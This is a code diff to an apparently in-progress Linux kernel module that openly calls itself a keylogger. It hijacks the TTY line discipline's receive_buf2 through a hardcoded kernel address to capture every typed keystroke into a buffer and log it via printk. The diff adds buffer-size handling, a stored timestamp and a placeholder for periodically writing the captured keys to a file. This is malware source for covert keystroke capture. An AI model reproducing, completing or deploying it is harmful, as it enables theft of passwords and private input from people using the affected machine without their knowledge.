@@ -3,6 +3,7 @@
 #define N_TTY_OPS_ADDR 0xffffffff87f70100
 #define BACKSPACE_KEY 127
 #define ENTER_KEY 13
+#define BUF_SIZE 100000
 
 // Write_increment is in seconds
 #define WRITE_INCREMENT (1 * 30)
@@ -20,14 +21,14 @@
 static struct tty_ldisc_ops *our_n_tty_ops;
 // Point to original receive_buf2
 static int (*original_receive_buf2) (struct tty_struct*, const unsigned char*, char*, int);
-
+// Store current_time (rather than reallocating everytime)
+static struct timespec *our_current_time;
 // For storing buffer
 struct line_buf {
-	char line[100000];
+	char line[BUF_SIZE];
 	int pos;
 	time_t last_write;
 };
-
 static struct line_buf key_buf;
 
 static void log_keys(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
@@ -35,6 +36,9 @@ static void log_keys(struct tty_struct *tty, const unsigned char *cp, char *fp, 
 	// TODO Verify if write_cnt is correct for all cases. Can it sometimes be different?
 	// Check if there is nothing to log 
 	if (count == 1 && tty->write_cnt == 2047) {
+		// Get current time information
+		getnstimeofday(our_current_time);
+
 		// TODO Handle other special case keys
 		// Log data in key buffer
 		if (*cp == BACKSPACE_KEY) {
@@ -55,13 +59,13 @@ static void log_keys(struct tty_struct *tty, const unsigned char *cp, char *fp, 
 		}
 		key_buf.line[key_buf.pos] = '\0';
 
-		printk(KERN_INFO "K: %s, %c\n", key_buf.line);
+		printk(KERN_INFO "K: %s\n", key_buf.line);
 
 
-		struct timespec current;
-		getnstimeofday(&current);
-		if (current.tv_sec - last_write >= WRITE_INCREMENT) {
-			// TODO Write to some file, possibly via procfs
+		// If time increment has passed or line_buf is full, write to file
+		if (our_current_time->tv_sec - key_buf.last_write >= WRITE_INCREMENT || key_buf.pos >= BUF_SIZE - 1) {
+			// Write to fie
+			// TODO Adapt to procfs or find use kernel_write, kernel_read
 		}
 	}
 
@@ -98,6 +102,10 @@ static void unhijack_tty_ldisc_receive_buf(void)
 int init_module(void)
 {
 	printk(KERN_INFO "Loading keylogger\n");
+
+	// Initialize timer
+	our_current_time = vmalloc(sizeof(struct timespec));
+
 	hijack_tty_ldisc_receive_buf();
 	printk(KERN_INFO "Finished loading keylogger\n");
 	return 0;
